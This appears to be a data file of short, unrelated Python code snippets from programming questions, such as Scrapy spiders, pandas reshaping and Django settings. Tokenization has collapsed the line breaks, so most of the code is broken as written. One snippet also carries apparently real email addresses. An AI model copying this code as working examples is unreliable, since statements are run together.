"def parse ( self , response ) : sel = Selector ( response ) videos = sel.xpath ( '//div [ @ class= '' video '' ] ' ) for video in videos : loader = ItemLoader ( VideoItem ( ) , videos ) loader.add_xpath ( 'original_title ' , './/u/text ( ) ' ) loader.add_xpath ( 'original_id ' , './/a [ @ class= '' hRotator '' ] / @ href ' , re=r'movies/ ( \d+ ) /.+\.html ' ) try : url = video.xpath ( './/a [ @ class= '' hRotator '' ] / @ href ' ) .extract ( ) [ 0 ] request = Request ( url , callback=self.parse_video_page ) except IndexError : pass request.meta [ 'loader ' ] = loader yield request pages = sel.xpath ( '//div [ @ class= '' pager '' ] //a/ @ href ' ) .extract ( ) for page in pages : url = urlparse.urljoin ( 'http : //www.mysite.com/ ' , page ) request = Request ( url , callback=self.parse ) yield requestdef parse_video_page ( self , response ) : loader = response.meta [ 'loader ' ] sel = Selector ( response ) loader.add_xpath ( 'original_description ' , '//* [ @ id= '' videoInfo '' ] //td [ @ class= '' desc '' ] /h2/text ( ) ' ) loader.add_xpath ( 'duration ' , '//* [ @ id= '' video-info '' ] /div [ 2 ] /text ( ) ' ) loader.add_xpath ( 'tags ' , '//* [ @ id= '' tags '' ] //a/text ( ) ' ) item = loader.load_item ( ) return item"
"( 0,0,8 ) ( 0,1,5 ) ( 0,2,3 ) ( 1,0,4 ) ( 1,1,0 ) ( 1,2,0 ) ( 2,0,1 ) ( 2,1,2 ) ( 2,2,5 ) Array ( [ [ 8,5,3 ] , [ 4,0,0 ] , [ 1,2,5 ] ] )"
"import pandas as pddf = pd.DataFrame ( pd.DataFrame ( [ [ 1,2,3,4 ] , [ 5,6,7,8 ] , [ 9,10,11,12 ] ] , columns= [ `` X_a '' , '' Y_c '' , '' X_b '' , '' Y_a '' ] ) ) X_a Y_c X_b Y_a0 1 2 3 41 5 6 7 82 9 10 11 12 X Y a b c a b c0 1 3 -1 4 -1 21 5 7 -1 8 -1 62 9 11 -1 12 -1 10"
A B C D E < ul > < li > A < ul > < li > B < /li > < li > C < ul > < li > D < /li > < li > E < /li > < /ul > < /li > < /ul > < /li > < /ul > import sysindent = 0last = [ ] for line in sys.stdin : count = 0 while line.startswith ( `` \t '' ) : count += 1 line = line [ 1 : ] if count > indent : indent += 1 last.append ( last [ -1 ] ) elif count < indent : indent -= 1 last = last [ : -1 ]
"Factory | Product_Number | Date | Avg_Noshow | Walk_Cost | Room_Rev -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - A | 1 | 01APR2017 | 5.6 | 125 | 275 -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - A | 1 | 02APR2017 | 4.5 | 200 | 300 -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - A | 1 | 03APR2017 | 6.6 | 150 | 250 -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - A | 1 | 04APR2017 | 7.5 | 175 | 325 -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - # Read csv fileimport csvwith open ( 'r2.csv ' , ' r ' ) as infile : reader = csv.DictReader ( infile ) data = { } for row in reader : for header , value in row.items ( ) : try : data [ header ] .append ( value ) except KeyError : data [ header ] = [ value ] # Transfer the column from list to arrays for later computation.mu = data [ 'Avg_Noshow ' ] cs = data [ 'Walk_Cost ' ] co = data [ 'Room_Rev ' ] mu = map ( float , mu ) cs = map ( float , cs ) co = map ( float , co ) File `` < stdin > '' , line 1 , in < module > KeyError : 'Room_Rev '"
"2012-02-16 03:56:53.012 /report/ 405 3ms 0kb AppEngine-Google ; ( +http : //code.google.com/appengine ) 2012-02-16 03:56:53.007 /createreport/ 302 20ms 0kb Mozilla/5.0 ( X11 ; Linux x86_64 ; rv:2.0 ) Gecko/20100101 Firefox/4.0I 2012-02-16 03:56:52.990 creating report task class CreateReportHandler ( webapp2.RequestHandler ) : def get ( self ) : logging.info ( 'creating report task ' ) taskqueue.add ( url=r'/report/ ' ) self.redirect ( '/ ' ) Route ( r'/createreport/ ' , handler=CreateReportHandler , name='createreport ' ) , class Report ( webapp2.RequestHandler ) : def get ( self ) : # Create a conversion request from HTML to PDF . users = User.query ( ) today = date.today ( ) startdate = date ( today.year , today.month , 1 ) # first day of month html = None for user in users : if user.activity ( ) > 0 : logging.info ( 'found active user % s % s ' % ( user.firstname , user.lastname ) ) html = ' < html > < body > < table border= '' 1 '' > ' html = html + ' < tr > < td > ORDER < /td > < td colspan= '' 2 '' > -- -- DISTRIBUTOR -- -- < /td > < td > ORDER < /td > < td > Silver < /td > < td > % < /td > < td > Total < /td > < td > Bonus < /td > < /tr > ' level = user.level ( ) distributor = user while distributor.has_downline ( ) : downline = User.query ( User.sponsor == distributor.key ) .order ( User.lastname ) .fetch ( ) for person in downline : # to this for whole downline orders = model.Order.all ( ) .filter ( 'distributor_id = ' , person.key.id ( ) ) .filter ( 'created > ' , startdate ) .filter ( 'status = ' , 'PAID ' ) .fetch ( 999999 ) silver = 0 name = person.firstname + ' '+ person.lastname for order in orders : logging.info ( 'found orders ' ) for idx , item in enumerate ( order.items ) : purchase = model.Item.get_by_id ( long ( item.id ( ) ) ) amount = int ( order.amounts [ idx ] ) silver = silver + amount*purchase.silver/1000.000 if len ( name ) > 13 : name = name [ 13 ] html = html + ' < tr > < td > ' + str ( order.created.date ( ) .day ) +'/'+ str ( order.created.date ( ) .month ) + ' < /td > < td > ' + filters.makeid ( person.key.id ( ) ) + ' < /td > < td > ' + name + ' < /td > < td > ' + str ( order.key ( ) .id ( ) ) + ' < /td > < td > ' + str ( silver ) dist_level = order.dist_level bonus = 0 if level == 5 and dist_level == 4 : bonus = 0.05 if level == 5 and dist_level == 3 : bonus = 0.1 if level == 5 and dist_level == 2 : bonus = 0.13 if level == 5 and dist_level == 1 : bonus = 0.35 if level == 4 and dist_level == 3 : bonus = 0.05 if level == 4 and dist_level == 2 : bonus = 0.08 if level == 4 and dist_level == 1 : bonus = 0.3 if level == 3 and dist_level == 2 : bonus = 0.03 if level == 3 and dist_level == 1 : bonus = 0.25 if level == 2 and dist_level == 1 : bonus = 0.2 html = html + ' < /td > < td > ' + str ( bonus ) + ' < /td > < td > ' + str ( order.total ) bonusmoney = bonus * float ( order.total ) html = html + ' < /td > < td > ' + str ( bonusmoney ) + ' < /td > < /tr > ' distributor = person html = html + ' < /table > ' asset = conversion.Asset ( `` text/html '' , html , `` test.html '' ) conversion_obj = conversion.Conversion ( asset , `` application/pdf '' ) rpc = conversion.create_rpc ( ) conversion.make_convert_call ( rpc , conversion_obj ) result = rpc.get_result ( ) if result.assets : for asset in result.assets : logging.info ( 'emailing report ' ) # to % s ' % user.email ) message = mail.EmailMessage ( sender='noreply @ bnano.se ' , subject='Report % s % s ' % ( user.firstname , user.lastname ) ) message.body = 'Here is the monthly report ' message.to = 'niklasro @ gmail.com ' message.bcc = 'fridge @ koolbusiness.com ' message.attachments = [ 'report.pdf ' , asset.data ] message.send ( ) logging.info ( 'message sent ' )"
"model = Sequential ( ) model.add ( Convolution1D ( filters=16 , kernel_size=35 , activation='relu ' , input_shape= ( 1 , window_length ) , data_format='channels_first ' ) ) model.add ( MaxPooling1D ( pool_size=5 ) model.add ( Convolution1D ( filters=16 , kernel_size=10 , activation='relu ' , data_format='channels_first ' ) ) [ ... ] # several other layers here _________________________________________________________________Layer ( type ) Output Shape Param # =================================================================conv1d_1 ( Conv1D ) ( None , 32 , 4966 ) 1152 _________________________________________________________________max_pooling1d_1 ( MaxPooling1 ( None , 4 , 4966 ) 0 _________________________________________________________________conv1d_2 ( Conv1D ) ( None , 16 , 4957 ) 656 =================================================================Total params : 1,808Trainable params : 1,808Non-trainable params : 0"
b -- -d-d -- d -- dd -- -d -- -- -- d
"triplets = ( ( x0 , y0 , z0 ) , ( x1 , y1 , z1 ) , ... , ( xn , yn , zn ) ) x = np.arange ( 20 , 40 , dtype=np.float64 ) y = np.arange ( 30 , 50 , dtype=np.float64 ) z = np.random.random ( 20 ) * 25.0triplets = np.hstack ( ( x , y , z ) ) .reshape ( ( len ( x ) ,3 ) ) query = ( a , b ) # where a , b are the x and y coordinates we 're looking forfor i in triplets : if i [ 0 ] == query [ 0 ] and i [ 1 ] == query [ 1 ] : result = i [ 2 ] points = triplets [ : ,0:2 ] # drops the z columntree = cKDTree ( points ) idx = tree.query ( ( a , b ) ) [ 1 ] # this returns a tuple , we want the indexquery = tree.data [ idx ] result = triplets [ idx , 2 ] f = interp2d ( x , y , z ) result = f ( a , b )"
"import tkinter as tkfrom tkinter import filedialogimport openpyxl , os , csvfrom openpyxl.utils import get_column_letter , column_index_from_string # Output FileoutputFile = open ( 'output.csv ' , ' w ' , newline= '' ) outputWriter = csv.writer ( outputFile ) # Tk initialization for file dialogroot = tk.Tk ( ) root.withdraw ( ) # Number of sheets to be comparednumber = input ( 'Enter number of workbook sheets for comparison : ' ) number = int ( number ) # Functions for generating file pathsdef generate_file_path ( ) : file_path = filedialog.askopenfilename ( title= '' Open Workbook '' ) return file_path # Variables to store file paths , workbooks and worksheetsall_ws = [ ] # Core function for program 's logisticsdef core ( ) : # for loops for generating file paths , workbooks and worsheets for x in range ( number ) : path = generate_file_path ( ) wb = openpyxl.load_workbook ( path ) ws = wb [ 'CBF ' ] all_ws.append ( ws ) # for loop to use for finding diff for row in all_ws [ 1 ] .iter_cols ( ) : for cellz in row : sheet_cols.append ( cellz.value ) # loop that checks if the value does not exist for ws_diff in range ( number ) : for row , row2 in zip ( all_ws [ 0 ] .iter_cols ( ) , all_ws [ 1 ] .iter_cols ( ) ) : for cell , cell2 in zip ( row , row2 ) : if cell.value not in sheet_cols : outputWriter.writerow ( [ str ( cell2.value ) ] )"
"def mydecorator ( f ) : def wrapper ( *args , **kwargs ) : f ( *args , **kwargs ) wrapper.__doc__ = f.__doc__ wrapper.__name__ = f.__name__ return wrapper @ mydecoratordef myfunction ( a , b , c ) : `` 'My docstring '' ' pass Help on function myfunction in module __main__ : myfunction ( *args , **kwargs ) My docstring"
"from urllib import requestsclass RemoteLogHandler ( logging.Handler ) : def emit ( self , record ) : remote_url = `` http : //foo.bar.baz '' req = request.Request ( remote_url , data=record.msg ) request.urlopen ( req , timeout=1 )"
"import pandas as pdimport numpy as npimport datetimedata = { 'value ' : [ 1,2,4,3 ] , 'names ' : [ 'joe ' , 'bob ' , 'joe ' , 'bob ' ] } start , end = datetime.datetime ( 2015 , 1 , 1 ) , datetime.datetime ( 2015 , 1 , 4 ) test = pd.DataFrame ( data=data , index=pd.DatetimeIndex ( start=start , end=end , freq= '' D '' ) , columns= [ `` value '' , `` names '' ] ) value names2015-01-01 1 joe2015-01-02 2 bob2015-01-03 4 joe2015-01-04 3 bob df.resample ( '2D ' ) value names 2015-01-01 2 bob 2015-01-03 4 joe"
"import threadingimport timeimport randomdef foo ( ) : a = 'spam'def bar ( ) : if random.random ( ) < 0.01 : # go into an infinite loop 1 % of the time while True : x = 42def run ( heartbeat ) : while True : foo ( ) bar ( ) heartbeat.set ( ) heartbeat = threading.Event ( ) t = threading.Thread ( target=run , args= ( heartbeat , ) ) t.start ( ) while True : time.sleep ( 1 ) if heartbeat.is_set ( ) : heartbeat.clear ( ) else : print ( 'Thread appears stuck at the following location : ' ) print ( get_thread_position ( t ) )"
string stringValue = string.IsNullOrEmpty ( otherString ) ? defaultString : otherString ;
"import pandas as pdd = { ( 'company1 ' , 'False Negative ' ) : { 'April- 2012 ' : 112.0 , 'April- 2013 ' : 370.0 , 'April- 2014 ' : 499.0 , 'August- 2012 ' : 431.0 , 'August- 2013 ' : 496.0 , 'August- 2014 ' : 221.0 } , ( 'company1 ' , 'False Positive ' ) : { 'April- 2012 ' : 0.0 , 'April- 2013 ' : 544.0 , 'April- 2014 ' : 50.0 , 'August- 2012 ' : 0.0 , 'August- 2013 ' : 0.0 , 'August- 2014 ' : 426.0 } , ( 'company1 ' , 'True Positive ' ) : { 'April- 2012 ' : 0.0 , 'April- 2013 ' : 140.0 , 'April- 2014 ' : 24.0 , 'August- 2012 ' : 0.0 , 'August- 2013 ' : 0.0 , 'August- 2014 ' : 77.0 } , ( 'company2 ' , 'False Negative ' ) : { 'April- 2012 ' : 112.0 , 'April- 2013 ' : 370.0 , 'April- 2014 ' : 499.0 , 'August- 2012 ' : 431.0 , 'August- 2013 ' : 496.0 , 'August- 2014 ' : 221.0 } , ( 'company2 ' , 'False Positive ' ) : { 'April- 2012 ' : 0.0 , 'April- 2013 ' : 544.0 , 'April- 2014 ' : 50.0 , 'August- 2012 ' : 0.0 , 'August- 2013 ' : 0.0 , 'August- 2014 ' : 426.0 } , ( 'company2 ' , 'True Positive ' ) : { 'April- 2012 ' : 0.0 , 'April- 2013 ' : 140.0 , 'April- 2014 ' : 24.0 , 'August- 2012 ' : 0.0 , 'August- 2013 ' : 0.0 , 'August- 2014 ' : 77.0 } , } df = pd.DataFrame ( d ) company1 company2 FN FP TP FN FP TPApril- 2012 112 0 0 112 0 0April- 2013 370 544 140 370 544 140April- 2014 499 50 24 499 50 24August- 2012 431 0 0 431 0 0August- 2013 496 0 0 496 0 0August- 2014 221 426 77 221 426 77 company1 company2 FN FP TP FN FP TPApril- 2012 1 0 0 1 0 0April- 2013 .35 .51 .13 .35 .51 .13April- 2014 .87 .09 .03 .87 .09 .03etc ."
"import googlesearchfrom newspaper import Articlequery = `` trump '' urlList = [ ] for j in googlesearch.search_news ( query , tld= '' com '' , num=500 , stop=200 , pause=.01 ) : urlList.append ( j ) print ( urlList ) articleList = [ ] for i in urlList : article = Article ( i ) article.download ( ) article.html article.parse ( ) articleList.append ( article.text ) print ( article.text ) Traceback ( most recent call last ) : File `` C : /Users/andre/PycharmProjects/StockBot/WebCrawlerTest.py '' , line 31 , in < module > article.parse ( ) File `` C : \Users\andre\AppData\Local\Programs\Python\Python37\lib\site-packages\newspaper\article.py '' , line 191 , in parse self.throw_if_not_downloaded_verbose ( ) File `` C : \Users\andre\AppData\Local\Programs\Python\Python37\lib\site-packages\newspaper\article.py '' , line 532 , in throw_if_not_downloaded_verbose ( self.download_exception_msg , self.url ) ) newspaper.article.ArticleException : Article ` download ( ) ` failed with 403 Client Error : Forbidden for url : https : //www.newsweek.com/donald-trump-hillary-clinton-2020-rally-orlando-1444697 on URL https : //www.newsweek.com/donald-trump-hillary-clinton-2020-rally-orlando-1444697"
"import numpy as npimport tensorflow as tfmnist = tf.keras.datasets.mnist ( x_train , _ ) , ( x_test , _ ) = mnist.load_data ( ) X = np.concatenate ( [ x_train , x_test ] ) X = X / 127.5 - 1X.reshape ( ( 70000 , 28 , 28 , 1 ) ) tf.image.grayscale_to_rgb ( X , name=None ) ValueError : Dimension 1 in both shapes must be equal , but are 84 and 3 . Shapes are [ 28,84 ] and [ 28,3 ] ."
http : //localhost:5000/regions ? where=name== '' El Salvador '' & where=lang== '' es ''
"features = get_features_for_input ( `` This was the best store i 've ever seen . `` ) result = ( sess.run ( tf.argmax ( prediction.eval ( feed_dict= { x : features } ) ,1 ) ) ) def train_neural_network ( x ) : prediction = neural_network_model ( x ) cost = tf.reduce_mean ( tf.nn.softmax_cross_entropy_with_logits ( logits=prediction , labels=y ) ) optimizer = tf.train.AdamOptimizer ( ) .minimize ( cost ) with tf.Session ( ) as sess : sess.run ( tf.global_variables_initializer ( ) ) for epoch in range ( hm_epochs ) : epoch_loss = 0 i = 0 while i < len ( train_x ) : start = i end = i + batch_size batch_x = np.array ( train_x [ start : end ] ) batch_y = np.array ( train_y [ start : end ] ) _ , c = sess.run ( [ optimizer , cost ] , feed_dict= { x : batch_x , y : batch_y } ) epoch_loss += c i+=batch_size print ( 'Epoch ' , epoch , 'completed out of ' , hm_epochs , 'loss : ' , epoch_loss ) correct = tf.equal ( tf.argmax ( prediction , 1 ) , tf.argmax ( y,1 ) ) accuracy = tf.reduce_mean ( tf.cast ( correct , 'float ' ) ) print ( 'Accuracy ' , accuracy.eval ( { x : test_x , y : test_y } ) ) # pos : [ 1,0 ] , argmax : 0 # neg : [ 0,1 ] , argmax : 1 features = get_features_for_input ( `` This was the best store i 've ever seen . '' ) result = ( sess.run ( tf.argmax ( prediction.eval ( feed_dict= { x : features } ) ,1 ) ) ) if result [ 0 ] == 0 : print ( 'Positive : ' , input_data ) elif result [ 0 ] == 1 : print ( 'Negative : ' , input_data ) def get_features_for_input ( input ) : current_words = word_tokenize ( input.lower ( ) ) current_words = [ lemmatizer.lemmatize ( i ) for i in current_words ] features = np.zeros ( len ( lexicon ) ) for word in current_words : if word.lower ( ) in lexicon : index_value = lexicon.index ( word.lower ( ) ) # OR DO +=1 , test both features [ index_value ] += 1 features = np.array ( list ( features ) ) train_neural_network ( x )"
"python manage.py test myproject.tests.test_store_a.StoreATest python manage.py test myproject.tests.test_store_a for page in self.data : TypeError : 'NoneType ' object is not iterable from django.test import TestCaseclass StoreTestCase ( TestCase ) : def setUp ( self ) : `` 'This should never execute but it does when I test test_store_a '' ' self.data = None def test_get_price ( self ) : for page in self.data : self.assertEqual ( store_a.get_price ( page [ 'url ' ] ) , page [ 'expected_price ' ] ) import store_afrom store_test import StoreTestCaseclass StoreATestCase ( StoreTestCase ) : def setUp ( self ) : self.data = [ { 'url ' : 'http : //www.foo.com/bar ' , 'expected_price ' : 7.99 } , { 'url ' : 'http : //www.foo.com/baz ' , 'expected_price ' : 12.67 } ]"
"< flask_login.AnonymousUserMixin object at 0xb67dbd4c > lm = LoginManager ( app ) lm.login_view = 'root ' @ lm.user_loaderdef load_user ( id ) : return User.query.get ( int ( id ) ) @ login_required @ app.route ( `` /messages '' ) def messages ( ) : print `` current user '' , current_user return `` hello world ''"
"# ! /usr/bin pythonimport zlibticket = open ( 'ticketdata.txt ' ) .read ( ) print zlib.decompress ( ticket ) 23 55 54 30 31 30 30 38 30 30 30 30 30 31 30 2c 02 14 1c 3d e9 2d cd 5e c4 c0 56 bd ae 61 3e 54 ad a1 b3 26 33 d2 02 14 40 75 03 d0 cf 9c c1 f5 70 58 bd 59 50 a7 af c5 eb 0a f4 74 00 00 00 00 30 32 37 31 78 9c 65 50 cb 4e c3 30 10 e4 53 2c 71 43 4a d9 f5 2b 36 b7 84 04 52 01 55 51 40 1c 51 01 23 2a 42 0e 21 15 3f c7 8d 1f 63 36 11 52 2b 7c f1 78 76 76 66 bd f7 8f 4d 5d 54 c4 44 ce 10 05 d2 eb 78 5b ac 32 7b b4 77 c8 11 6b 62 c7 d6 79 aa ea aa 16 e1 b2 22 4d c4 01 ad 36 58 61 ca 6b 30 c6 e5 64 a0 b6 97 0f a6 a9 6f d6 71 df c7 cf 3e 7f 37 93 66 8e c6 71 de 92 4c c0 e1 22 0d fd 57 7a cb ee b6 cf ef 69 54 fd 66 44 05 31 d0 03 18 01 05 40 04 70 9c 51 46 ad 38 49 33 00 86 20 dd 42 88 04 22 5f a6 a1 db f6 78 79 d4 79 95 76 1f 3f df fd e7 98 86 16 b1 30 0b 65 d6 3c bd 2a 15 ce d8 ab e5 79 9d 47 7b da 34 13 c7 34 73 5a 6b 0b 35 72 d9 5c 0d bb ae 53 aa e8 5f 86 b4 01 e9 25 8d 0d 50 8e 72 3c 39 3c b2 13 94 82 74 ce 2d c7 b3 41 8b ed 4c 9f f5 0b e2 85 6c 01 8c fe c7 b8 e9 87 8c d9 f1 90 28 a3 73 fe 05 6d de 5f f1 dsa_signature = `` zlib_data = `` cursor = 0with open ( 'ticketdata.txt ' , `` rb '' ) as fp : chunk = fp.read ( 1 ) while chunk : if ( cursor < 68 ) : dsa_signature += chunk else : zlib_data += chunk chunk = fp.read ( 1 ) cursor = cursor + 1print `` \nSignature : '' print `` % s\n '' % dsa_signatureprint `` \nCompressed data : '' print `` % s\n '' % zlib_dataprint `` \nDecoded : '' print zlib.decompress ( zlib_data )"
"def include_f_locals ( self , exc , task_id , args , kwargs , einfo ) : import logging logger = logging.getLogger ( 'celery ' ) logger.error ( exc , exc_info=einfo ) CELERY_ANNOTATIONS = { '* ' : { 'on_failure ' : include_f_locals } }"
"list_get ( ) list_get ( key , `` city '' , 0 ) list_get ( key , 'contact_no ' , 2 , { } , policy ) list_get ( key , `` contact_no '' , 0 ) list_get ( key , `` contact_no '' , 1 , { } , policy , `` '' ) list_get ( key , `` contact_no '' , 0 , 888 )"
"[ ' 4 ' , ' 3 ' , ' 5 ' , ' 7 ' , ' 6 ' , ' 2 ' , ' 0 ' , ' 1 ' ] T=nx.Graph ( ) nodelist= [ ] for i in eo : vertex=str ( i ) bag=set ( ) bag.add ( vertex ) for j in chordal_graph.neighbors ( str ( i ) ) : bag.add ( str ( j ) ) T.add_node ( frozenset ( bag ) ) nodelist.append ( frozenset ( bag ) ) chordal_graph.remove_node ( str ( i ) ) for node1 in range ( len ( nodelist ) ) : found=False for node2 in range ( node1+1 , len ( nodelist ) ) : if found==False and len ( nodelist [ node1 ] .intersection ( nodelist [ node2 ] ) ) > 0 : T.add_edge ( nodelist [ node1 ] , nodelist [ node2 ] ) found=True nx.draw ( T ) p.show ( )"
"> > > testString = `` 'Bãｃｏл íｐѕüϻ Ꮷ߀ɭｏｒ ｓìｔ äｍéｔ ｑûìｓ àɭïɋüíｐ ｃüｌρä , ϻａｇｎâ èх ѕêԁ ѕｔｒíρ ｓｔêãｋ ｉл ԁò ｕｔ ｓåｌáｍí éхèｒｃìｔáｔïｏл ｐòｒƙ ɭ߀ｉｎ . Téԉԁëｒɭ߀íｎ ｔùｒｋèϒ ѕáûｓáɢè лùɭɭå ｐɑｒïáｔûｒ , ƃáｌｌ ｔíｐ âԁｉρïѕｉｃïԉǥ ɑᏧ ｃ߀ԉｓêｑｕäｔ ϻâｇлã ｖéлïｓｏл . Míлíｍ àｕｔë ѵ߀ɭüρｔåｔｅ ｍòɭɭíｔ ｔｒｉ-ｔíρ ｄèｓêｒùԉｔ . Oｃｃãèｃáｔ ｖëԉｉｓ߀ԉ êХ ｅｉùѕｍ߀ｄ ｓéᏧ ｌáｂｏｒüϻ ｐòｒƙ ｌòïл àｌｉɋûå ìлｃíԁìԁúԉｔ . Sｅｄ ｃòｍϻ߀Ꮷ߀ յｏɰｌ ｏｆｆíｃíä ｐòｒƙ ƅèɭｌｙ ｔéｍρòｒ ｌâƅòｒùϻ ｔâｉɭ ｓρåｒê ｒíｂｓ ｔｏлǥｕｅ ϻêáｔɭòáｆ ｍåɢｎä.Kｉèɭｂàѕã ｉｎ ｃòлѕêｃｔêｔｕｒ ѵëлíàϻ ｐâｒíɑｔùｒ ｐ߀ｒｋ ɭ߀ｉｎ êｘêｒｃìｔâｔｉòл äｌìɋúíρ ｃâρｉｃｏｌɑ ρｏｒｋ ｔòлɢüê ｄüｉｓ ԁ߀ɭｏｒé ｒêｐｒéｈéԉᏧéｒïｔ . Tèｎԁèｒｌｏｉԉ ëх ｒèρｒéհｅԉԁéｒïｔ ｆûｇíãｔ äｄｉｐìｓｉｃｉԉｇ ｇｒ߀üｎᏧ ｒｏúлｄ , ƅａɭɭ ｔíｐ հàϻƃûｒǥèｒ ѕɦòùｌｄｅｒ ɭåｂ߀ｒûϻ ｔêｍρｏｒ ｒíƃêｙë . Eѕｓè ｈàϻ ѵëԉｉａｍ , åɭíɋùɑ ìｒüｒｅ ρòｒƙ ｃɦｏｐ ԁò ԁ߀ɭｏｒé ｆｒâｎｋｆüｒｔｅｒ ｎüｌｌａ ｐåｓｔｒäϻí ｓàｕｓàｇè ｓèᏧ . Eӽｃêｐｔêüｒ ѕëｄ ｔ-ｂ߀лë հɑϻ , ｅｓѕë ｕｔ ɭàƅｏｒíѕ ƃáｌｌ ｔíρ ｎｏｓｔｒúԁ ｓհ߀üｌｄêｒ ïｎ ｓｈòｒｔ ｒíƅｓ ρáｓｔｒáｍï . Eｓｓé ｈａｍƅûｒǥëｒ ɭäƅòｒé , ｆａｔƃàｃƙ ｔｅԉｄｅｒｌòïｎ ｓհ߀ｒｔ ｒïｂｓ ρｒòìｄéｎｔ ｒｉƅêｙｅ ɭａｂ߀ｒｕｍ . Nｕｌｌɑ ｔüｒԁùｃƙèｎ л߀ｎ , ｓρａｒè ｒìƅｓ ｅӽｃｅρｔｅｕｒ áｄïρìѕìｃïԉǥ êｔ ѕɦｏｒｔ ɭòｉｎ ｄｏｌｏｒë äｎïｍ ｄêѕêｒùлｔ . Sհäлƙｌè ｃúｐïԁäｔáｔ ｐｏｒｋ ｌòïｎ ｍéåｔｂäｌｌ , ԉ߀ｓｔｒｕｄ ｒéｐｒèհéԉԁêｒìｔ ɦɑϻｂｕｒǥêｒ ѕâɭɑϻí Ꮷｏｌ߀ｒè ɑｄ ｌêｂｅｒƙãｓ.Bｏûｄｉл ｔｏлǥｕê ｃ߀ԉｓèｑûåｔ ｅà ｒüｍρ ƅáｌɭ ｔíρ ѕρâｒé ｒìｂѕ íｎ ｐｒòｉᏧｅｎｔ ｄûｉѕ ϻíлïｍ èíｕѕｍòᏧ ｃ߀ｒԉêᏧ ƃèèｆ ƅɑｃ߀л ｄ߀ｌｏｒè . Cｏｒｎèｄ ƅëèｆ ｄｒûｍｓｔｉｃƙ ｃùｌｐａ , éлïｍ ｂａɭɭ ｔìｐ ϻéａｔｂâｌɭ ｌａｂ߀ｒê ｔｒｉ-ｔïｐ ｖëｎｉｓｏԉ ǥｒｏùԉԁ ｒòùлԁ հɑｍ ｉл èä ｂãｃòｎ . Eѕѕé ìᏧ ѕúԉｔ , ｓհｏùｌｄéｒ ƙïｅɭƃäѕà ãԁｉρｉｓïｃïԉɢ ɦａϻｂûｒｇêｒ úｔ ԁòɭ߀ｒｅ ｆåｔｂäｃƙ ԁ߀ɭòｒ äлïｍ ｔｒï-ｔíｐ . EíùｓϻòᏧ ｎüｌɭã ｌäｂòｒｕϻ лíѕｉ êｘｃéｐｔèúｒ . Oｃｃåéｃåｔ Ꮷüíѕ ԁèｓｅｒüлｔ ｔｏԉǥｕｅ ϳ߀ｗɭ . Rèρｒéɦëԉԁêｒｉｔ áɭïｑúíｐ ｆûǥｉàｔ ｔùｒｋｅｙ ｖéｎｉãϻ ｑüìѕ . ' '' > > > testString.swapcase ( ) .swapcase ( ) == testStringTrue"
export GOOGLE_APPLICATION_CREDENTIALS=/the-credentials.jsonfrom oauth2client.client import GoogleCredentialscredentials = GoogleCredentials.get_application_default ( ) credentials.get_access_token ( ) curl -u _token : < mytoken > https : //eu.gcr.io/v2/my-project/my-docker-image/tags/list
class Server ( object ) : _started = False def started ( self ) : if ( self._started == False ) : raise NotConnectedException @ started def doServerAction ( self ) : ...
"if pixel_x > 1920 and pixel_y > 1080 : Qapp.setAttribute ( Qt.AA_EnableHighDpiScaling , True ) Qapp.setAttribute ( Qt.AA_UseHighDpiPixmaps , True ) else : Qapp.setAttribute ( Qt.AA_EnableHighDpiScaling , False ) Qapp.setAttribute ( Qt.AA_UseHighDpiPixmaps , False ) import sys , ctypesuser32 = ctypes.windll.user32user32.SetProcessDPIAware ( ) screen_width = 0 # 78screen_height = 1 # 79 [ pixel_x , pixel_y ] = [ user32.GetSystemMetrics ( screen_width ) , user32.GetSystemMetrics ( screen_height ) ] def screen_selection ( ) : app = QApplication ( sys.argv ) valid_screens = [ ] for index , screen_no in enumerate ( app.screens ( ) ) : screen = app.screens ( ) [ index ] dpi = screen.physicalDotsPerInch ( ) valid_screens.append ( dpi ) return valid_screens"
"import os # Build paths inside the project like this : os.path.join ( BASE_DIR , ... ) BASE_DIR = os.path.dirname ( os.path.dirname ( os.path.abspath ( __file__ ) ) ) # Quick-start development settings - unsuitable for production # See https : //docs.djangoproject.com/en/2.0/howto/deployment/checklist/ # SECURITY WARNING : keep the secret key used in production secret ! SECRET_KEY = ' # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # ' # SECURITY WARNING : do n't run with debug turned on in production ! DEBUG = TrueALLOWED_HOSTS = [ '127.0.0.1 ' , '.pythonanywhere.com ' ] # Application definitionINSTALLED_APPS = [ 'django.contrib.admin ' , 'django.contrib.auth ' , 'django.contrib.contenttypes ' , 'django.contrib.sessions ' , 'django.contrib.messages ' , 'django.contrib.staticfiles ' , 'blog ' , ] MIDDLEWARE = [ 'django.middleware.security.SecurityMiddleware ' , 'django.contrib.sessions.middleware.SessionMiddleware ' , 'django.middleware.common.CommonMiddleware ' , 'django.middleware.csrf.CsrfViewMiddleware ' , 'django.contrib.auth.middleware.AuthenticationMiddleware ' , 'django.contrib.messages.middleware.MessageMiddleware ' , 'django.middleware.clickjacking.XFrameOptionsMiddleware ' , ] ROOT_URLCONF = 'new_p.urls'TEMPLATES = [ { 'BACKEND ' : 'django.template.backends.django.DjangoTemplates ' , 'DIRS ' : [ ] , 'APP_DIRS ' : True , 'OPTIONS ' : { 'context_processors ' : [ 'django.template.context_processors.debug ' , 'django.template.context_processors.request ' , 'django.contrib.auth.context_processors.auth ' , 'django.contrib.messages.context_processors.messages ' , ] , } , } , ] WSGI_APPLICATION = 'new_p.wsgi.application ' # Database # https : //docs.djangoproject.com/en/2.0/ref/settings/ # databasesDATABASES = { 'default ' : { 'ENGINE ' : 'django.db.backends.sqlite3 ' , 'NAME ' : os.path.join ( BASE_DIR , 'db.sqlite3 ' ) , } } # Password validation # https : //docs.djangoproject.com/en/2.0/ref/settings/ # auth-password-validatorsAUTH_PASSWORD_VALIDATORS = [ { 'NAME ' : 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator ' , } , { 'NAME ' : 'django.contrib.auth.password_validation.MinimumLengthValidator ' , } , { 'NAME 